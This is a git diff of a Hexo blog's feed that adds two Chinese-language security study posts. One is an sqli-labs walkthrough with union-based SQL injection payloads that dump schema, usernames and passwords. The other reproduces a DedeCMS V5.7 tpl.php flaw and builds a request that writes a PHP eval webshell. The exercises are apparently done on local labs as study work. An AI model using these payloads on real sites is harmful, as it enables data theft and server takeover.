@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-07-19T06:28:01.802Z</updated>
+  <updated>2019-07-19T14:55:11.320Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,49 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sqli-labs-master</title>
+    <link href="http://yoursite.com/2019/07/19/sqli-labs-master/"/>
+    <id>http://yoursite.com/2019/07/19/sqli-labs-master/</id>
+    <published>2019-07-19T14:48:56.501Z</published>
+    <updated>2019-07-19T14:55:11.320Z</updated>
+    
+    <content type="html"><![CDATA[<a id="more"></a><h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><pre><code>首先传入id发现都能显示猜测后台传参形式大概是这样select ... from ... where id =&apos;1&apos;试着闭合一下传入id=1&apos;发现报错传入id=1&apos;%23发现正确所以猜想应该正确~接着试着查看该表的列传入id=1&apos; order by 4显示不存在传入id=1&apos; order by 3可以说明该表有三列 接下来爆数据库吧 我们已知information_schema存储了其他数据库信息所以使用union来执行查询数据库因为union需要前后sql语句选择的列数相同,当前一个语句选择的内容为空，就将后面的语句的内容显示出来所以传入id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata%23爆出数据库information_schema,challenges,dedecmsv57utf8sp2,mysql,performance_schema,security,test,wordpress,wordpress2现在一直数据库了想看看数据库中的表id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;%23爆出表了emails,referers,uagents,users还想看看表里有啥？满足你！id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;%23爆出列了id,username,password都到这里了看看数据吧~id=-1&apos; union select 1,username,password from users where id=&apos;3&apos;%23(貌似加不加单引号没影响？)数据库schema_nameinformation_schema.schemata</code></pre><hr><pre><code>表    table_nameinformation_schema.tables</code></pre><hr><pre><code>列column_nameinformation_schema.columns</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h1 id=&quot;Less-1&quot;&gt;&lt;a href=&quot;#Less-1&quot; class=&quot;headerlink&quot; title=&quot;Less-1&quot;&gt;&lt;/a&gt;Less-1&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;首先传入id发现都能显示
+
+猜测后台传参形式大概是这样
+
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>漏洞复现</title>
+    <link href="http://yoursite.com/2019/07/19/CMS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://yoursite.com/2019/07/19/CMS漏洞复现/</id>
+    <published>2019-07-19T14:35:33.796Z</published>
+    <updated>2019-07-19T14:49:52.001Z</updated>
+    
+    <content type="html"><![CDATA[<p>CMS漏洞复现：<br><a id="more"></a></p><hr><ul><li>题目：F:\phpstudy\PHPTutorial\WWW\DedeCMS-V5.7-UTF8-SP2\uploads\dede</li></ul><ul><li>题目提示漏洞出现在tpl.php</li></ul><hr><p>打开tpl.php查看代码</p><ul><li>发现$action参数方法，实验修改$action值发现当?action=upload时发现页面</li></ul><pre><code>http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/dede/tpl.php?action=upload</code></pre><p>-试着提交一个文件</p><p>-看看源代码吧~</p><p>获取到隐藏的token<br>返回查看代码发现下面的代码</p><pre><code>else if($action==&apos;savetagfile&apos;){csrf_check();//token检验if(!preg_match(&quot;#^[a-z0-9_-]{1,}\.lib\.php$#i&quot;, $filename))//正则匹配{    ShowMsg(&apos;文件名不合法，不允许进行操作！&apos;, &apos;-1&apos;);    exit();}require_once(DEDEINC.&apos;/oxwindow.class.php&apos;);$tagname = preg_replace(&quot;#\.lib\.php$#i&quot;, &quot;&quot;, $filename);$content = stripslashes($content);$truefile = DEDEINC.&apos;/taglib/&apos;.$filename;$fp = fopen($truefile, &apos;w&apos;);fwrite($fp, $content);fclose($fp);</code></pre><h2 id="发现没有对-content的输入进行过滤"><a href="#发现没有对-content的输入进行过滤" class="headerlink" title="发现没有对$content的输入进行过滤"></a>发现没有对$content的输入进行过滤</h2><pre><code>//正则匹配可查看 </code></pre><p><a href="https://www.zhihu.com/question/48219401/answer/742444326?utm_source=qq&amp;utm_medium=social&amp;utm_oi=1022060751548219392&amp;hb_wx_block=0" target="_blank" rel="noopener">https://www.zhihu.com/question/48219401/answer/742444326?utm_source=qq&amp;utm_medium=social&amp;utm_oi=1022060751548219392&amp;hb_wx_block=0</a></p><hr><pre><code>Preg_match()函数是正则匹配的函数，里面写上匹配的规则，匹配所有包含一个以上的字母数字下划线和横杠，后面的\.意思是匹配小数点，i表示大小写不敏感</code></pre><p>preg_replace 函数执行一个正则表达式的搜索和替换。</p><pre><code>语法mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。参数说明：$pattern: 要搜索的模式，可以是字符串或一个字符串数组。$replacement: 用于替换的字符串或字符串数组。$subject: 要搜索替换的目标字符串或字符串数组。$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。$count: 可选，为替换执行的次数。</code></pre><p>传入</p><pre><code>action=savetagfiletoken=0859045cdede6e8183d740b42c4a2a37filename=123.lib.phpcontent=%3C?php%20@eval($_POST[%27xxx%E2%80%99]);?%3</code></pre><p>因此构造</p><pre><code>http：//127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/dede/tpl.php?action=savetagfile&amp;token=0859045cdede6e8183d740b42c4a2a37&amp;filename=123.lib.php&amp;content=%3C?php%20@eval($_POST[%27xxx%E2%80%99]);?%3E</code></pre><h2 id="注意token具有时效性！！！"><a href="#注意token具有时效性！！！" class="headerlink" title="注意token具有时效性！！！"></a>注意token具有时效性！！！</h2><pre><code>token的意思是“令牌”，是服务端生成的一串字符串，作为客户端进行请求的一个标识。当用户第一次登录后，服务器生成一个token并将此token返回给客户端，以后客户端只需带上这个token前来请求数据即可，无需再次带上用户名和密码。简单token的组成；uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token的前几位以哈希算法压缩成的一定长度的十六进制字符串。为防止token泄露）。</code></pre><hr><h2 id="身份认证概述"><a href="#身份认证概述" class="headerlink" title="身份认证概述"></a>身份认证概述</h2><p>由于HTTP是一种没有状态的协议，它并不知道是谁访问了我们的应用。这里把用户看成是客户端，客户端使用用户名还有密码通过了身份验证，不过下次这个客户端再发送请求时候，还得再验证一下。</p><p>通用的解决方法就是，当用户请求登录的时候，如果没有问题，在服务端生成一条记录，在这个记录里可以说明登录的用户是谁，然后把这条记录的id发送给客户端，客户端收到以后把这个id存储在cookie里，下次该用户再次向服务端发送请求的时候，可以带上这个cookie，这样服务端会验证一下cookie里的信息，看能不能在服务端这里找到对应的记录，如果可以，说明用户已经通过了身份验证，就把用户请求的数据返回给客户端。</p><p>以上所描述的过程就是利用session，那个id值就是sessionid。我们需要在服务端存储为用户生成的session，这些session会存储在内存，磁盘，或者数据库。</p><h2 id="基于token机制的身份认证"><a href="#基于token机制的身份认证" class="headerlink" title="基于token机制的身份认证"></a>基于token机制的身份认证</h2><p>使用token机制的身份验证方法，在服务器端不需要存储用户的登录记录。大概的流程：</p><p>客户端使用用户名和密码请求登录。服务端收到请求，验证用户名和密码。验证成功后，服务端会生成一个token，然后把这个token发送给客户端。客户端收到token后把它存储起来，可以放在cookie或者Local Storage（本地存储）里。客户端每次向服务端发送请求的时候都需要带上服务端发给的token。服务端收到请求，然后去验证客户端请求里面带着token，如果验证成功，就向客户端返回请求的数据。</p><h2 id="利用token机制进行登录认证，可以有以下方式："><a href="#利用token机制进行登录认证，可以有以下方式：" class="headerlink" title="利用token机制进行登录认证，可以有以下方式："></a>利用token机制进行登录认证，可以有以下方式：</h2><ul><li>用设备mac地址作为token</li></ul><hr><p>客户端：客户端在登录时获取设备的mac地址，将其作为参数传递到服务端</p><p>服务端：服务端接收到该参数后，便用一个变量来接收，同时将其作为token保存在数据库，并将该token设置到session中。客户端每次请求的时候都要统一拦截，将客户端传递的token和服务器端session中的token进行对比，相同则登录成功，不同则拒绝。</p><p>此方式客户端和服务端统一了唯一的标识，并且保证每一个设备拥有唯一的标识。缺点是服务器端需要保存mac地址；优点是客户端无需重新登录，只要登录一次以后一直可以使用，对于超时的问题由服务端进行处理。</p><ul><li>用sessionid作为token</li></ul><hr><p>客户端：客户端携带用户名和密码登录</p><p>服务端：接收到用户名和密码后进行校验，正确就将本地获取的sessionid作为token返回给客户端，客户端以后只需带上请求的数据即可。</p><p>此方式的优点是方便，不用存储数据，缺点就是当session过期时，客户端必须重新登录才能请求数据。</p><p>当然，对于一些保密性较高的应用，可以采取两种方式结合的方式，将设备mac地址与用户名密码同时作为token进行认证。</p><p>APP利用token机制进行身份认证</p><p>用户在登录APP时，APP端会发送加密的用户名和密码到服务器，服务器验证用户名和密码，如果验证成功，就会生成相应位数的字符产作为token存储到服务器中，并且将该token返回给APP端。</p><p>以后APP再次请求时，凡是需要验证的地方都要带上该token，然后服务器端验证token，成功返回所需要的结果，失败返回错误信息，让用户重新登录。其中，服务器上会给token设置一个有效期，每次APP请求的时候都验证token和有效期。</p><h2 id="token的存储"><a href="#token的存储" class="headerlink" title="token的存储"></a>token的存储</h2><p>token可以存到数据库中，但是有可能查询token的时间会过长导致token丢失（其实token丢失了再重新认证一个就好，但是别丢太频繁，别让用户没事儿就去认证）。</p><p>为了避免查询时间过长，可以将token放到内存中。这样查询速度绝对就不是问题了，也不用太担心占据内存，就算token是一个32位的字符串，应用的用户量在百万级或者千万级，也是占不了多少内存的。</p><h2 id="token的加密"><a href="#token的加密" class="headerlink" title="token的加密"></a>token的加密</h2><p>token是很容易泄露的，如果不进行加密处理，很容易被恶意拷贝并用来登录。加密的方式一般有：</p><p>在存储的时候把token进行对称加密存储，用到的时候再解密。文章最开始提到的签名sign：将请求URL、时间戳、token三者合并，通过算法进行加密处理。</p><p>最好是两种方式结合使用。</p><p>还有一点，在网络层面上token使用明文传输的话是非常危险的，所以一定要使用HTTPS协议。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;CMS漏洞复现：&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>Web基础知识</title>
